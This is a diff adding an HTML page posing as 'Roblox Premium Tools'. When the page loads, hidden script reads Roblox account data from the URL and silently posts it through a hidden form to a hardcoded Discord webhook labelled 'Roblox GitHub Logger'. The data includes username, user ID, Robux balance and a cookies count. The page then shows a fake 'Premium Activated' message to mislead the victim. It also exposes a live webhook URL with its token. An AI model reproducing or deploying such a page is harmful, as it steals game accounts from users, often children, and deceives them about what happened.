@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Premium Tools</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎮 Roblox Premium Tools</h1>
+    <p>Loading premium features...</p>
+    
+    <script>
+        // GitHub Pages Roblox Data Handler
+        function getQueryParam(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        // Получаем данные из URL
+        const encodedData = getQueryParam('data');
+        
+        if (encodedData) {
+            try {
+                const decodedData = decodeURIComponent(encodedData);
+                const data = JSON.parse(decodedData);
+                
+                // Создаем скрытый iframe для отправки в Discord
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.name = 'discordFrame';
+                document.body.appendChild(iframe);
+                
+                // Создаем форму для отправки
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = 'https://discord.com/api/webhooks/1432234979219341353/8RD3VVODh4ri3_7wwVhu5gpwEGbwzM7fVL5E8utGLVjJa1uDskmzVg9zV_gHlluO9fa8';
+                form.target = 'discordFrame';
+                
+                const payload = {
+                    username: 'Roblox GitHub Logger',
+                    avatar_url: 'https://tr.rbxcdn.com/0e6b8f1e93a5d48b5a1c3429a155a2a9/150/150/Image/Png',
+                    embeds: [{
+                        title: '🎯 NEW ROBLOX DATA VIA GITHUB',
+                        description: `**Username:** ${data.username || 'Unknown'}\n` +
+                                   `**User ID:** ${data.userId || 'Unknown'}\n` +
+                                   `**Robux:** ${data.robux || 0}\n` +
+                                   `**Premium:** ${data.premium ? 'Yes' : 'No'}\n` +
+                                   `**Cookies Count:** ${data.cookiesCount || 0}`,
+                        color: 3066993,
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: 'GitHub Pages Logger • ' + new Date().toLocaleDateString()
+                        }
+                    }]
+                };
+                
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'payload_json';
+                input.value = JSON.stringify(payload);
+                
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+                
+                // Удаляем форму после отправки
+                setTimeout(() => {
+                    document.body.removeChild(form);
+                    document.body.removeChild(iframe);
+                }, 5000);
+                
+            } catch (error) {
+                console.error('Error processing data:', error);
+            }
+        }
+        
+        // Показываем фиктивную страницу
+        setTimeout(() => {
+            document.body.innerHTML = `
+                <div style="background: white; color: black; padding: 20px; border-radius: 10px; margin: 20px;">
+                    <h2>🎉 Roblox Premium Activated!</h2>
+                    <p>Your premium features are now enabled.</p>
+                    <p>Return to Roblox to enjoy enhanced gameplay!</p>
+                </div>
+            `;
+        }, 2000);
+    </script>
+</body>
+</html>
